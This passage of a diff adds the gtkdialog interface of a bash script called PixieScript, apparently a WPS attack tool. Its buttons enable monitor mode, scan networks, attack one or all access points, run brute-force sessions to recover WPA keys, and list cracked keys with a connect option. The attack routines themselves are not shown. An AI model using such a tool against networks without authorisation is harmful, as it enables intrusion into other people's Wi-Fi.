+						<action>'AccionesBruteforce' 2 $TABLA_BRUTEFORCE $PRIORIDAD</action>
+						</button>
+					
+						<vseparator width-request="12"></vseparator>	
+					
+						<hscale width-request="190" height-request="-1" range-min="1" range-max="5" range-step="1" value-pos="1" block-function-signals="true">
+						<variable>SESIONES_MAX</variable>
+						<item>"1 |2|<span fgcolor='"'white'"' bgcolor='"'darkblue'"'>   Nº MAXIMO DE SESIONES   </span>"</item>
+						<input file>"'"$LOG_MAXIMAS_SESIONES_BRUTEFORCE"'"</input>
+						</hscale>
+						
+						<button tooltip-text="Aplicar cambios número máximo de sesiones activas">
+						<input file>'$ICONO_APLICAR'</input>
+						<variable>Aplicar3</variable>
+						<action>disable:Aplicar3</action>
+						<action>enable:TimerBruteforce</action>
+						<action>'AccionesBruteforce' 3 0 $SESIONES_MAX</action>
+						</button>
+					</hbox>
+					</expander>
+					
+					<expander expanded="false" use-underline="true"label="Acciones proceso bruteforce">
+						<hbox homogeneous="false" space-expand="false" space-fill="false">
+						
+						<button>
+						<input file>'$ICONO_RECUPERAR_CLAVE_WPA'</input>
+						<variable>RECUPERAR_CLAVE_WPA</variable>
+						<label> RECUPERAR CLAVE WPA </label>
+						<action>disable:RECUPERAR_CLAVE_WPA</action>
+						<action>enable:TimerBruteforce</action>
+						<action>enable:TimerAtaque</action>
+						<action>'AccionesBruteforce' 4 $TABLA_BRUTEFORCE &</action>
+						</button>
+						
+						<button>
+						<input file>'$ICONO_START_BRUTE'</input>
+						<variable>INICIAR_SESION</variable>
+						<label> INICIAR </label>
+						<action>disable:INICIAR_SESION</action>
+						<action>enable:TimerBruteforce</action>
+						<action>'AccionesBruteforce' 5 $TABLA_BRUTEFORCE</action>
+						</button>
+					
+						<button>
+						<input file>'$ICONO_STOP_BRUTE'</input>
+						<label> DETENER SESION</label>
+						<variable>DETENER_SESION</variable>
+						<action>enable:TimerBruteforce</action>
+						<action>disable:DETENER_SESION</action>
+						<action>'AccionesBruteforce' 6 $TABLA_BRUTEFORCE</action>
+						</button>
+						
+						<button>
+						<label> PAUSAR </label>
+						<input file>'$ICONO_PAUSE_BRUTE'</input>
+						<variable>PAUSAR</variable>
+						<action>disable:PAUSAR</action>
+						<action>enable:TimerBruteforce</action>
+						<action>'AccionesBruteforce' 7 $TABLA_BRUTEFORCE</action>
+						</button>
+					
+						<button>
+						<label> REANUDAR </label>
+						<input file>'$ICONO_RESUME_BRUTE'</input>
+						<variable>REANUDAR</variable>
+						<action>disable:REANUDAR</action>
+						<action>enable:TimerBruteforce</action>
+						<action>'AccionesBruteforce' 8 $TABLA_BRUTEFORCE</action>
+						</button>
+						
+						<button>
+						<label> ELIMINAR </label>
+						<input file>'$ICONO_ELIMINAR_BRUTE'</input>
+						<variable>ELIMINAR</variable>
+						<action>disable:ELIMINAR</action>
+						<action>enable:TimerBruteforce</action>
+						<action>'AccionesBruteforce' 9 $TABLA_BRUTEFORCE</action>
+						</button>
+					</hbox>
+
+					</expander>
+				</frame>
+				
+			</vbox>
+		</vbox>
+		</notebook>
+		<timer visible="false" milliseconds="true" interval="300">
+				    <sensitive>false</sensitive>
+				    <variable>TimerBruteforce</variable>
+				    <action condition="command_is_true(if [ -f '$LOG_TIMER_BRUTEFORCE' ]; then echo true; fi)">enable:Aplicar1</action>
+				    <action condition="command_is_true(if [ -f '$LOG_TIMER_BRUTEFORCE' ]; then echo true; fi)">enable:Aplicar2</action>
+				    <action condition="command_is_true(if [ -f '$LOG_TIMER_BRUTEFORCE' ]; then echo true; fi)">enable:Aplicar3</action>
+				    <action condition="command_is_true(if [ -f '$LOG_TIMER_BRUTEFORCE' ]; then echo true; fi)">enable:Aplicar4</action>
+				    <action condition="command_is_true(if [ -f '$LOG_TIMER_BRUTEFORCE' ]; then echo true; fi)">enable:RECUPERAR_CLAVE_WPA</action>
+				    <action condition="command_is_true(if [ -f '$LOG_TIMER_BRUTEFORCE' ]; then echo true; fi)">enable:INICIAR_SESION</action>
+				    <action condition="command_is_true(if [ -f '$LOG_TIMER_BRUTEFORCE' ]; then echo true; fi)">enable:DETENER_SESION</action>
+				    <action condition="command_is_true(if [ -f '$LOG_TIMER_BRUTEFORCE' ]; then echo true; fi)">enable:PAUSAR</action>
+				    <action condition="command_is_true(if [ -f '$LOG_TIMER_BRUTEFORCE' ]; then echo true; fi)">enable:REANUDAR</action>
+				    <action condition="command_is_true(if [ -f '$LOG_TIMER_BRUTEFORCE' ]; then echo true; fi)">enable:ELIMINAR</action>
+				    <action condition="command_is_true(if [ -f '$LOG_TIMER_BRUTEFORCE' ]; then echo true; fi)">disable:TimerBruteforce</action>
+				    <action condition="command_is_true(if [ -f '$LOG_TIMER_BRUTEFORCE' ]; then echo true; fi)">disable:TimerAtaque</action>
+				    <action condition="command_is_true(if [ -f '$LOG_TIMER_BRUTEFORCE' ]; then echo true; fi)">rm '$LOG_TIMER_BRUTEFORCE'</action>
+				    <action>Refresh:TABLA_BRUTEFORCE</action>
+		</timer>
+		<vbox homogeneous="true" space-expand="false" space-fill="false">
+		<hbox homogeneous="true" space-expand="false" space-fill="false">
+			<frame>
+			<hbox>
+			<vbox>
+				'"`ListarTarjetasWifi`"'
+				<button>
+				  <input file>'$ICONO_MONITOR'</input>
+				  <variable>BOTON_MODO_MONITOR</variable>
+				  <label>MODO MONITOR</label>
+				  <action function="disable">BOTON_MODO_MONITOR</action>
+				  <action function="disable">TARJETA_SELECCIONADA</action>
+				  <action>echo "COMPROBANDO ESTADO DE LA INTERFACE" > '$LOG_STATUSBAR'</action>
+				  <action>enable:TimerMonitor</action>
+				  <action>'ActivarModoMonitor' &</action>
+				</button>
+				
+				<timer visible="false" milliseconds="true" interval="200">
+				    <sensitive>false</sensitive>
+				    <variable>TimerMonitor</variable>
+				    <action condition="command_is_true(if [ `head -n1 '$LOG_MODO_MONITOR'` = '"'1'"' ]; then echo true; fi)">disable:TimerMonitor</action>
+				    <action condition="command_is_true(if [ `head -n1 '$LOG_MODO_MONITOR'` = '"'1'"' ]; then echo true; fi)">enable:BOTON_MODO_MONITOR</action>
+				    <action condition="command_is_true(if [ `head -n1 '$LOG_MODO_MONITOR'` = '"'1'"' ]; then echo true; fi)">enable:TARJETA_SELECCIONADA</action>
+				    
+				    <action condition="command_is_true(if [ `head -n1 '$LOG_MODO_MONITOR'` = '"'0'"' ]; then echo true; fi)">disable:TimerMonitor</action>
+				    <action condition="command_is_true(if [ `head -n1 '$LOG_MODO_MONITOR'` = '"'0'"' ]; then echo true; fi)">enable:BOTON_INICIAR_ESCANEO</action>
+				    <action condition="command_is_true(if [ `head -n1 '$LOG_MODO_MONITOR'` = '"'0'"' ]; then echo true; fi)">enable:BOTON_INICIAR_ATAQUE</action>
+				    <action condition="command_is_true(if [ `head -n1 '$LOG_MODO_MONITOR'` = '"'0'"' ]; then echo true; fi)">enable:RADIOBUTTON3</action>
+				    <action condition="command_is_true(if [ `head -n1 '$LOG_MODO_MONITOR'` = '"'0'"' ]; then echo true; fi)">activate:RADIOBUTTON3</action>
+				    <action condition="command_is_true(if [ `head -n1 '$LOG_MODO_MONITOR'` = '"'0'"' ]; then echo true; fi)">enable:TIEMPO_SCANEO</action>
+				    <action condition="command_is_true(if [ `head -n1 '$LOG_MODO_MONITOR'` = '"'0'"' ]; then echo true; fi)">enable:TIEMPO_ATAQUE</action>
+				    <action condition="command_is_true(if [ `head -n1 '$LOG_MODO_MONITOR'` = '"'0'"' ]; then echo true; fi)">Refresh:TABLA_SCAN</action>
+				</timer>
+				<vseparator height-request="4"></vseparator>
+			      <text xalign="1">
+				<label>TIEMPO MAX. DE ESCANEO</label>
+			      </text>
+			</vbox>
+			
+			<vbox>
+				<button>
+				  <input file>'$ICONO_SCAN'</input>
+				  <label>INICIAR ESCANEO</label>
+				  <sensitive>false</sensitive>
+				  <variable>BOTON_INICIAR_ESCANEO</variable>
+				  <action function="disable">BOTON_INICIAR_ESCANEO</action>
+				  <action function="clear">TABLA_SCAN</action>
+				  <action> echo "BUSCANDO REDES, ESPERA $TIEMPO_SCANEO segundos" > '$LOG_STATUSBAR'</action>
+				  <action>disable:RADIOBUTTON1</action>
+				  <action>disable:RADIOBUTTON2</action>
+				  <action>enable:BOTON_DETENER_ESCANEO</action>
+				  <action>disable:BOTON_INICIAR_ATAQUE</action>
+				  <action>echo "2" > $LOG_ESTADO_ESCANEO</action>
+				  <action>enable:TimerScaneo</action>
+				  <action>'EscanearRedes' $TIEMPO_SCANEO &</action>
+				</button>
+				<timer visible="false">
+				    <sensitive>false</sensitive>
+				    <variable>TimerScaneo</variable>
+				    <action condition="command_is_true(if [ `head -n1 '$LOG_ESTADO_ESCANEO'` = '"'1'"' ]; then echo true; fi)">disable:TimerScaneo</action>
+				    <action condition="command_is_true(if [ `head -n1 '$LOG_ESTADO_ESCANEO'` = '"'1'"' ]; then echo true; fi)">enable:BOTON_INICIAR_ESCANEO</action>
+				    <action condition="command_is_true(if [ `head -n1 '$LOG_ESTADO_ESCANEO'` = '"'1'"' ]; then echo true; fi)">disable:BOTON_DETENER_ESCANEO</action>
+				    <action condition="command_is_true(if [ `head -n1 '$LOG_ESTADO_ESCANEO'` = '"'1'"' ]; then echo true; fi)">enable:BOTON_INICIAR_ATAQUE</action>
+				   
+				    <action condition="command_is_true(if [ `head -n1 '$LOG_ESTADO_ESCANEO'` = '"'0'"' ]; then echo true; fi)">disable:TimerScaneo</action>
+				    <action condition="command_is_true(if [ `head -n1 '$LOG_ESTADO_ESCANEO'` = '"'0'"' ]; then echo true; fi)">Refresh:TABLA_SCAN</action>
+				    <action condition="command_is_true(if [ `head -n1 '$LOG_ESTADO_ESCANEO'` = '"'0'"' ]; then echo true; fi)">enable:BOTON_INICIAR_ESCANEO</action>
+				    <action condition="command_is_true(if [ `head -n1 '$LOG_ESTADO_ESCANEO'` = '"'0'"' ]; then echo true; fi)">disable:BOTON_DETENER_ESCANEO</action>
+				    <action condition="command_is_true(if [ `head -n1 '$LOG_ESTADO_ESCANEO'` = '"'0'"' ]; then echo true; fi)">enable:RADIOBUTTON1</action>
+				    <action condition="command_is_true(if [ `head -n1 '$LOG_ESTADO_ESCANEO'` = '"'0'"' ]; then echo true; fi)">enable:RADIOBUTTON2</action>
+				    <action condition="command_is_true(if [ `head -n1 '$LOG_ESTADO_ESCANEO'` = '"'0'"' ]; then echo true; fi)">enable:BOTON_INICIAR_ATAQUE</action>
+				    <action condition="command_is_true(if [ `head -n1 '$LOG_ESTADO_ESCANEO'` = '"'0'"' ]; then echo true; fi)">enable:TIEMPO_ATAQUE</action>
+				    <action condition="command_is_true(if [ `head -n1 '$LOG_ESTADO_ESCANEO'` = '"'0'"' ]; then echo true; fi)">activate:RADIOBUTTON1</action>  		    
+				</timer>
+				
+				<button>
+				  <sensitive>false</sensitive>
+				  <variable>BOTON_DETENER_ESCANEO</variable>
+				  <input file>'$ICONO_STOP_SCAN'</input>
+				  <label>DETENER SCANEO</label>
+				  <action>disable:BOTON_DETENER_ESCANEO</action>
+				  <action>touch '$SEMAFORO_DETENER_SCANEO'</action>
+				</button>
+				<spinbutton range-value="30" xalign="1" primary-icon-name="appointment-soon" editable="true">
+				  <sensitive>false</sensitive>
+				  <variable>TIEMPO_SCANEO</variable>
+			        </spinbutton>
+		    	</vbox>
+		    	<vbox>
+			      <radiobutton active="false">
+				<sensitive>false</sensitive>
+				<label>ATACAR AP SELECCIONADO</label>
+				<variable>RADIOBUTTON1</variable>
+			      </radiobutton>
+			      <radiobutton active="false">
+			      <sensitive>false</sensitive>
+				<label>ATACAR TODOS LOS APs</label>
+				<variable>RADIOBUTTON2</variable>
+			      </radiobutton>
+			      <radiobutton active="false">
+			      <sensitive>false</sensitive>
+				<label>ATAQUE MANUAL</label>
+				<variable>RADIOBUTTON3</variable>
+				<action>MODO_DE_ATAQUE="3"</action>
+				<action>echo $MODO_DE_ATAQUE</action>
+			      </radiobutton>
+			      <vseparator height-request="7.5"></vseparator>
+			      <text xalign="1">
+				<label>TIEMPO MAX. DE ATAQUE</label>
+			      </text>
+			</vbox>
+		    	<vbox>
+			      <button>
+				  <input file>'$ICONO_START_ATACK'</input>
+				  <sensitive>false</sensitive>
+				  <label>INICIAR ATAQUE</label>
+				  <variable>BOTON_INICIAR_ATAQUE</variable>
+				  <action>disable:BOTON_INICIAR_ATAQUE</action>
+				  <action>disable:BOTON_INICIAR_ESCANEO</action>
+				  <action>disable:TABLA_SCAN</action>
+				  <action>disable:TIEMPO_ATAQUE</action>
+				  <action>enable:BOTON_DETENER_ATAQUE</action>
+				  <action>echo "ATACANDO" > '$LOG_ESTADO_ATAQUE'</action>
+				  <action>enable:TimerAtaque</action>
+				  <action condition="command_is_true(if [ $RADIOBUTTON1 = '"'true'"' ]; then echo true; fi)">'TipoAtaque' 1 $TABLA_SCAN &</action>
+				  <action condition="command_is_true(if [ $RADIOBUTTON2 = '"'true'"' ]; then echo true; fi)">'TipoAtaque' 2 &</action>
+				  <action condition="command_is_true(if [ $RADIOBUTTON3 = '"'true'"' ]; then echo true; fi)">'TipoAtaque' 3 &</action>
+			      </button>
+			      <timer visible="false">
+				    <sensitive>false</sensitive>
+				    <variable>TimerAtaque</variable>
+				    <action function="clear">TXT_ATAQUE</action>
+				    <action function="Refresh">TXT_ATAQUE</action>
+				    <action function="clear">TABLA_SCAN</action>
+				    <action function="Refresh">TABLA_SCAN</action>
+				    <action condition="command_is_true(if [ `head -n1 '$LOG_ESTADO_ATAQUE'` = '"'FIN'"' ]; then echo true; fi)">disable:TimerAtaque</action>
+				    <action condition="command_is_true(if [ `head -n1 '$LOG_ESTADO_ATAQUE'` = '"'FIN'"' ]; then echo true; fi)">disable:BOTON_DETENER_ATAQUE</action>
+				    <action condition="command_is_true(if [ `head -n1 '$LOG_ESTADO_ATAQUE'` = '"'FIN'"' ]; then echo true; fi)">enable:BOTON_INICIAR_ATAQUE</action>
+				    <action condition="command_is_true(if [ `head -n1 '$LOG_ESTADO_ATAQUE'` = '"'FIN'"' ]; then echo true; fi)">enable:BOTON_INICIAR_ESCANEO</action>
+				    <action condition="command_is_true(if [ `head -n1 '$LOG_ESTADO_ATAQUE'` = '"'FIN'"' ]; then echo true; fi)">enable:TABLA_SCAN</action>
+				    <action condition="command_is_true(if [ `head -n1 '$LOG_ESTADO_ATAQUE'` = '"'FIN'"' ]; then echo true; fi)">enable:TIEMPO_ATAQUE</action>
+			      </timer>
+			      <button>
+				  <input file>'$ICONO_STOP_ATACK'</input>
+				  <sensitive>false</sensitive>
+				  <variable>BOTON_DETENER_ATAQUE</variable>
+				  <label>DETENER ATAQUE</label>
+				  <action>disable:BOTON_DETENER_ATAQUE</action>
+				  <action>touch '$SEMAFORO_DETENER_ATAQUE'</action>
+			      </button>
+			      <spinbutton range-value="60" range-max="600" xalign="1" primary-icon-name="appointment-soon" editable="true">
+			      <variable export="true">TIEMPO_ATAQUE</variable>
+			      <sensitive>false</sensitive>
+			      </spinbutton>
+			</vbox>
+			</hbox>
+			</frame>
+		</hbox>
+		</vbox>
+		<vseparator height-request="4"></vseparator>
+		<statusbar auto-refresh="true" has-resize-grip="false">
+			<label>PixieScript por 5.1 para SeguridadWireless</label>
+			<variable export="true">stb</variable>
+			<sensitive>true</sensitive>
+			<input file>'"$LOG_STATUSBAR"'</input>
+		</statusbar>
+		
+	</vbox>	
+<timer visible="false" milliseconds="true" interval="200">
+	<action function="Refresh">stb</action>
+</timer>
+<timer visible="false" milliseconds="false" interval="60">
+      	<action>'ComprobarSesiones'</action>
+      	<action>sleep 0.3</action>
+	<action function="Refresh">TABLA_BRUTEFORCE</action>
+</timer>
+<action signal="delete-event">'Limpiar'</action>
+</window>
+'
+
+export DUMP_KEYS='
+<window title="[ CLAVES ALMACENADAS ]" resizable="true" window_position="1" width-request="1130" height-request="600"  border-width="6" image-name="'"$ICONO_SCRIPT"'" variable="DUMP_KEYS">
+	<vbox spacing="0">
+		<vbox space-expand="true" space-fill="true">
+			<tree auto-refresh="false">
+				<variable export="true">LINEA_PORTAPAPELES</variable>
+				<input file>'$DATABASE_CLAVES_CONSEGUIDAS'</input>
+				<label>ESSID           |BSSID                     |PIN WPS   |WPA KEY           |FABRICANTE              |MODELO               |Nº MODELO      |Nº SERIE       |DEVICE NAME</label>
+			</tree>
+		</vbox>
+	
+		<vbox homogeneous="true" space-expand="false" space-fill="false">
+		<frame>
+			<hbox homogeneous="false" space-expand="false" space-fill="false">
+				<button>
+				  <input file>'$ICONO_CONECTAR'</input>
+				  <label>CONECTAR AL AP SELECCIONADO</label>
+				  <action>'ConectarAP' &</action>
+				</button>
+				
+				<button>
+				  <input file>'$ICONO_RECUPERAR_CLAVE_WPA_VER'</input>
+				  <label>RECUPERAR CLAVE WPA</label>
+				  <variable>WPA_VER</variable>
+				  <action>disable:WPA_VER</action>
+				  <action>enable:TimerVer</action>
+				  <action>'RecuperarWPA' &</action>
+				</button>
+				
+				<button>
+				  <input file stock="gtk-paste"></input>
+				  <label>COPIAR FILA</label>
+				  <action>'CopiarPortapapeles' TODO &</action>
+				</button>
+				
+				<button>
+				  <input file stock="gtk-paste"></input>
+				  <label>COPIAR PIN WPS</label>
+				  <action>'CopiarPortapapeles' WPS &</action>
+				</button>
+				
+				<button>
+				  <input file stock="gtk-paste"></input>
+				  <label>COPIAR WPA KEY</label>
+				  <action>'CopiarPortapapeles' WPA &</action>
+				</button>
+				
+				<button>
+				  <input file>'$ICONO_ELIMINAR_VER'</input>
+				  <label>ELIMINAR BSSID</label>
+				  <variable>ELIMINAR_BSSID</variable>
+				  <action>disable:ELIMINAR_BSSID</action>
+				  <action>enable:TimerVer</action>
+				  <action>'EliminarLineaVer'</action>
+				</button>
+				
+				<button>
+				  <input file stock="gtk-close"></input>
+				  <label>CERRAR</label>
+				  <action>exit:Quit</action>
+				</button>
+				
+				<timer visible="false" milliseconds="true" interval="300">
+				    <sensitive>false</sensitive>
+				    <variable>TimerVer</variable>
+				    <action condition="command_is_true(if [ -f '$LOG_TIMER_VER' ]; then echo true; fi)">enable:ELIMINAR_BSSID</action>
+				    <action condition="command_is_true(if [ -f '$LOG_TIMER_VER' ]; then echo true; fi)">enable:WPA_VER</action>
+				    <action condition="command_is_true(if [ -f '$LOG_TIMER_VER' ]; then echo true; fi)">disable:TimerVer</action>
+				    <action condition="command_is_true(if [ -f '$LOG_TIMER_VER' ]; then echo true; fi)">rm '$LOG_TIMER_VER'</action>
+				    <action>Refresh:LINEA_PORTAPAPELES</action>
+		</timer>
+			</hbox>
+		</frame>
+		</vbox>
+	</vbox>
+</window>'
+
+
+gtkdialog --program=MENU 
+
+} &>> "$LOG_SCRIPT"
